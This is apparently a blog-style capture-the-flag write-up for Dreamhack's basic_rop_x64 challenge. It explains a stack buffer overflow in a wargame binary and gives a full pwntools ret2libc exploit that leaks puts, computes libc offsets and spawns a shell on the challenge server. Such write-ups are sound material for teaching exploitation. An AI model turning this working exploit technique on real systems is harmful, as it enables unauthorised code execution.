+++
date = '2026-05-05'
draft = false
title = 'Dreamhack basic_rop_x64 Writeup'
ShowToc = true
tags = ["Dreamhack", "pwn"]
+++

## Challenge overview

이 문제는 서버에서 작동하고 있는 서비스(basic_rop_x64)의 바이너리와 소스 코드가 주어집니다.
Return Oriented Programming 공격 기법을 통해 셸을 획득한 후, "flag" 파일을 읽으세요.
"flag" 파일의 내용을 워게임 사이트에 인증하면 점수를 획득할 수 있습니다.
플래그의 형식은 DH{...} 입니다.

---

```c
int __fastcall main(int argc, const char **argv, const char **envp)
{
  _BYTE buf[64]; // [rsp+10h] [rbp-40h] BYREF
  __int64 savedregs; // [rsp+50h] [rbp+0h] BYREF

  memset(buf, 0, sizeof(buf));
  initialize(&savedregs, argv, buf);
  read(0, buf, 0x400u);
  write(1, buf, 64u);
  return 0;
}
```

## Identifying the vulnerabilities

64-bit rop, right? No PIE, NX enabled. So I suppose ret2libc. `puts` isn't used in main, but luckily the alarm handler prints "TIME OUT", so the binary has both the got and plt entries.

What was weird, was that I calculated that we need 64 bytes for the buffer, 8 bytes for the savedregs and another 8 for `rbp` but apparently, only 64 + 8 bytes were needed.

I crafted the local exploit, then I connected remotely to find the proper puts offset with libc.blukat. I found it first try: `libc6_2.35-0ubuntu1_amd64`. 

![challenge-screenshot](flag.png#center)

## The exploit

```python
from pwn import *
elf = ELF('/home/kali/Downloads/dreamhack/rop64/basic_rop_x64')
p=elf.process()

context.arch = 'amd64'
cyberedu = 'host8.dreamhack.games:18360'

ip, port = cyberedu.split(':')
port = int(port)

if args.REMOTE:
    p = remote(ip, port)
else:
    p = elf.process()
    
pop_rdi_ret = 0x400883
ret = 0x4005a9
puts_plt = elf.plt[b'puts']
puts_got = elf.got[b'puts']
main = 0x4007ba

payload = b"A"*63 + b"S" + b"B"*8 + p64(pop_rdi_ret) + p64(puts_got) + p64(puts_plt) + p64(main)
p.send(payload)

p.recvuntil(b"S")
data = p.recvline().strip()
val = u64(data.ljust(8, b"\x00"))

print(f"puts ist {hex(val)}!")

puts_offset = 0x084ed0
system_offset = 0x054d60
binsh_offset = 0x1dc698

libc = val - puts_offset
system = libc + system_offset
binsh = libc + binsh_offset

payload = b"A"*63 + b"S" + b"B"*8 + p64(pop_rdi_ret) + p64(binsh) + p64(ret) + p64(system)
p.send(payload)

p.interactive()
```

---

As always, the full code can be found on my GitHub 
**[here](https://github.com/irinasusca/ctf-writeups/blob/main/dreamhack/basic_rop_x64.py)**.
